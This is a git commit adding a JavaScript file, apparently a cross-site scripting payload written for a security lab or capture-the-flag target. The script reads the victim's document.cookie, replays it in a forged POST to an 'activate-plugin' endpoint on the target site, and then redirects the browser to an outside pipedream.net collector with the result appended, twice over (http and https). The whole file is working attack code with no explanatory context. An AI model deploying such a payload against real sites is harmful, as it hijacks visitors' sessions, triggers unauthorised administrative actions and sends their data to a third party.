fe663d0b7a71d044f0c89cf61d6c07769b8b7fb6
FermaLeRetour <114008563+FermaLeRetour@users.noreply.github.com>
2023-11-24 18:19:07 +0100

    Add files via upload

---
+++ send_request_11.js
@@ -0,0 +1,52 @@
+var url = 'https://website-gafswq.inst.malicecyber.com/activate-plugin/1';
+
+var headers = {
+  'Cookie': document.cookie,
+  
+
+};
+
+fetch(url, {
+  method: 'POST',
+  headers: headers
+})
+  .then(response => {
+    // Process the response as needed
+    document.location="https://enpw216ps367.x.pipedream.net/?="+response
+    console.log('Response:', response);
+    // Handle the response data, e.g., response.json(), response.text(), etc.
+  })
+  .catch(error => {
+    document.location="https://enpw216ps367.x.pipedream.net/?="+error
+    console.error('Error:', error);
+  });
+
+
+
+  var url = 'http://website-gafswq.inst.malicecyber.com/activate-plugin/1';
+
+  var headers = {
+    'Cookie': document.cookie,
+    
+  
+  };
+  
+  fetch(url, {
+    method: 'POST',
+    headers: headers
+  })
+    .then(response => {
+      // Process the response as needed
+      document.location="https://enpw216ps367.x.pipedream.net/?="+response
+      console.log('Response:', response);
+      // Handle the response data, e.g., response.json(), response.text(), etc.
+    })
+    .catch(error => {
+      document.location="https://enpw216ps367.x.pipedream.net/?="+error
+      console.error('Error:', error);
+    });
+  
+
+
+
+
